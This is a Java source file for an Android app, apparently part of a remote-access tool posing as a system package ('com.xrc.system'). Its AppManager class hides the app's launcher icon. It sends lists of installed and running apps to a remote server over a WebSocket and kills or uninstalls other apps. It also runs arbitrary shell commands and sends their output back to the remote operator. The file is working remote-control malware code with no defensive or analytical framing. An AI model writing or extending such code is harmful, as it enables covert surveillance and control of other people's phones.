package com.xrc.system.features;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Process;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.List;

public class AppManager {
    private static final String TAG = Constants.TAG + ":App";
    private static AppManager instance;
    private final Context ctx;
    private final PackageManager pm;

    private AppManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.pm = ctx.getPackageManager();
    }

    public static synchronized AppManager get(Context ctx) {
        if (instance == null) instance = new AppManager(ctx);
        return instance;
    }

    public void hideIcon() {
        try {
            pm.setComponentEnabledSetting(
                    new android.content.ComponentName(ctx, "com.xrc.system.ui.MainActivity"),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            ConfigManager.get(ctx).setBoolean(Constants.PREF_ICON_HIDDEN, true);
        } catch (Exception e) {
            Log.e(TAG, "Hide icon failed", e);
        }
    }

    public void showIcon() {
        try {
            pm.setComponentEnabledSetting(
                    new android.content.ComponentName(ctx, "com.xrc.system.ui.MainActivity"),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
            ConfigManager.get(ctx).setBoolean(Constants.PREF_ICON_HIDDEN, false);
        } catch (Exception e) {
            Log.e(TAG, "Show icon failed", e);
        }
    }

    public void launchApp(String pkg) {
        try {
            Intent intent = pm.getLaunchIntentForPackage(pkg);
            if (intent != null) {
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Launch failed: " + pkg, e);
        }
    }

    public void uninstallApp(String pkg) {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + pkg));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Uninstall failed: " + pkg, e);
        }
    }

    public void killApp(String pkg) {
        try {
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    // API 21+ killBackgroundProcesses only works for own app or with special permissions
                    am.killBackgroundProcesses(pkg);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Kill failed: " + pkg, e);
        }
    }

    public void listInstalled() {
        new Thread(() -> {
            try {
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                JSONArray arr = new JSONArray();
                for (ApplicationInfo app : apps) {
                    JSONObject obj = new JSONObject();
                    obj.put("pkg", app.packageName);
                    obj.put("name", pm.getApplicationLabel(app).toString());
                    obj.put("system", (app.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                    arr.put(obj);
                }
                JSONObject data = new JSONObject();
                data.put("apps", arr);
                XRCWebSocketClient.get(ctx).sendEvent("installed_apps", data);
            } catch (JSONException e) {
                Log.e(TAG, "List apps failed", e);
            }
        }).start();
    }

    public void listRunning() {
        new Thread(() -> {
            try {
                ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
                JSONArray arr = new JSONArray();
                if (am != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
                    List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
                    if (procs != null) {
                        for (ActivityManager.RunningAppProcessInfo proc : procs) {
                            JSONObject obj = new JSONObject();
                            obj.put("pid", proc.pid);
                            obj.put("pkg", proc.processName);
                            obj.put("importance", proc.importance);
                            arr.put(obj);
                        }
                    }
                }
                JSONObject data = new JSONObject();
                data.put("running", arr);
                XRCWebSocketClient.get(ctx).sendEvent("running_apps", data);
            } catch (JSONException e) {
                Log.e(TAG, "List running failed", e);
            }
        }).start();
    }

    public void setVolume(int level) {
        try {
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                int vol = Math.max(0, Math.min(level * max / 100, max));
                am.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0);
            }
        } catch (Exception e) {
            Log.e(TAG, "Volume set failed", e);
        }
    }

    public void mute() {
        try {
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0);
            }
        } catch (Exception e) {
            Log.e(TAG, "Mute failed", e);
        }
    }

    public void vibrate(int ms) {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(android.os.VibrationEffect.createOneShot(ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(ms);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Vibrate failed", e);
        }
    }

    public void showToast(String msg) {
        try {
            Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Log.e(TAG, "Toast failed", e);
        }
    }

    public void execShell(String cmd) {
        new Thread(() -> {
            try {
                java.lang.Process proc = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                proc.waitFor();
                proc.destroy();
                JSONObject data = new JSONObject();
                data.put("cmd", cmd);
                data.put("output", sb.toString());
                XRCWebSocketClient.get(ctx).sendEvent("shell_output", data);
            } catch (Exception e) {
                Log.e(TAG, "Shell exec failed", e);
            }
        }).start();
    }
}
